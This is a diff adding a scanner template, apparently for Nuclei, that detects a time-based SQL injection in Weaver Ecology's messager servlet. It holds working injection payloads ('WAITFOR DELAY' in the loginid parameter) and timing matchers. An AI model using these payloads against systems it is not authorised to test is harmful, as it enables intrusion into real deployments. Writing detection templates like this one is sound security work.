@@ -1,0 +1,39 @@
+id: weaver-messager-time-sqli
+info:
+  name: 泛微 Ecology messager 接口 - SQL 注入漏洞
+  author: Chaitin
+  severity: high
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: weaver
+    product: ecology
+  tags: sqli,vuln,weaver,ecology
+variables:
+  sleepLong: '{{rand_int(5, 8)}}'
+  sleepShort: '{{rand_int(2, 4)}}'
+flow: http(1) && http(2) && http(3)
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/weaver/weaver.messager.MessagerServlet?method=addRecentlyContact&loginid=1'+WAITFOR+DELAY+'00:00:00'/*&fromJid='*/--"
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "<data>") && len(body) < 20'
+  - max-redirects: 0
+    method: GET
+    path:
+      - "{{BaseURL}}/weaver/weaver.messager.MessagerServlet?method=addRecentlyContact&loginid=1'+WAITFOR+DELAY+'00:00:0{{sleepLong}}'/*&fromJid='*/--"
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration * 1000 - baseline >= sleepLong * 1000'
+  - max-redirects: 0
+    method: GET
+    path:
+      - "{{BaseURL}}/weaver/weaver.messager.MessagerServlet?method=addRecentlyContact&loginid=1'+WAITFOR+DELAY+'00:00:0{{sleepShort}}'/*&fromJid='*/--"
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration * 1000 - baseline >= sleepShort * 1000 && duration * 1000 < longlatency'
